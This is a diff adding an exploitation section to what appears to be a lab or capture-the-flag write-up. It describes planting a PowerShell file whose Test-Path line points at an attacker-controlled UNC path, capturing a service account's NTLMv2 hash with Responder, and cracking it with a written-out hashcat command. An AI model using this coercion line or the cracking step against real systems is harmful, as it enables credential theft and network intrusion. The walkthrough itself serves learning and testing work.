@@ -72,17 +72,33 @@ Further enumeration of the SMB shares amounted to nothing as anonymous access wa
 
 
 
-
 ---
 
 ### Exploitation
 
+We attempted to target the svc.scanner via a file coercion attack. To do this we placed a specially crafted file on writeable share containing a `Test Path` reference to a UNC path pointing at our listener. 
 
+```powershell
+Test-Path \\10.146.82.44\icons\icon.ico
+```
 
+![Plant-File-Creation](proxyimg/plant-file.jpeg)
 
+We placed the file on the `IT-Shared`, the share which `svc.scanner` periodically scans
 
+![Plant-File](proxyimg/file-plant.jpeg)
 
+We then initiated Responder to listen for incoming connection requests 
 
+![Responder](proxyimg/responder.jpeg)
+
+svc.scanner's automated process runs our `test.ps1` and hits the `Test-Path \\10.146.82.44\icons\icon.ico` line. The target then opens an SMB connection to our machine to check for the existence of the icon file. Our responder catches the incoming authentication connection and initiates NTLM authentication, issuing a challenge. The target machine signs the challenge with their password hash and sends it back.
+
+Responder receives `svc.scanner` NTLM hash and we save it to a file. We then use hashcat (mode 5600) to crack the NTLMv2 hash offline against the rockyou.txt wordlist
+
+```bash
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
 
 
 
